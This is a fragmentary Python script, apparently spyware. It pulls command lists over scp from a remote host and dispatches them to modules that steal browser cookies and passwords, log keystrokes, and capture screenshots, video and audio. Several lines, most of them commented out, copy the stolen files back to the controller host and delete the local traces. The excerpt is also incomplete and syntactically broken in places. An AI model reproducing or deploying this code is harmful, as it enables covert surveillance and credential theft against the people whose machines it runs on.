...
os.system("scp koala@192.168.222.13:~/comandos.txt /tmp 1>/dev/null")
...
for c in comandos:
    if c == "cookies":
       		os.system("python firecookies.py")	
                #os.system('scp /tmp/cookies.txt koala@192.168.222.13:~/cookies 1>/dev/null')
                #os.system('rm -f /tmp/cookies.txt')

    elif c == "contrasenas":
       		os.system("python firepass.py")
                #os.system('scp /tmp/firepass.txt koala@192.168.222.13:~/contrasenas 1>/dev/null')
        	...
        	keylogger.keylog(mo.group(1))
                #os.system('scp /tmp/key.txt koala@192.168.222.13:~/keylogger 1>/dev/null')
                #os.system('rm -f /tmp/key.txt')
    
    elif re.search('captura',c):
                mo = re.match('captura ([tn]{1,1}) (\d+)',c);
                captura.tiempo(mo.group(1),mo.group(2))
                #os.system('scp /tmp/*.jpg koala@192.168.222.13:~/capturas 1>/dev/null')
                #os.system('rm -f /tmp/*.jpg')

 
    elif re.search('captvid',c):
                mo = re.match('captvid (\d+)',c);
                #os.system('scp /tmp/*.avi koala@192.168.222.13:~/video 1>/dev/null')
                ...
                #os.system('scp /tmp/*.wav koala@192.168.222.13:~/audio 1>/dev/null')
...
if os.path.exists("/tmp/comandosnovalidos")
	#os.system('scp /tmp/comandosnovalidos.txt koala@192.168.222.13:~/error 1>/dev/null')
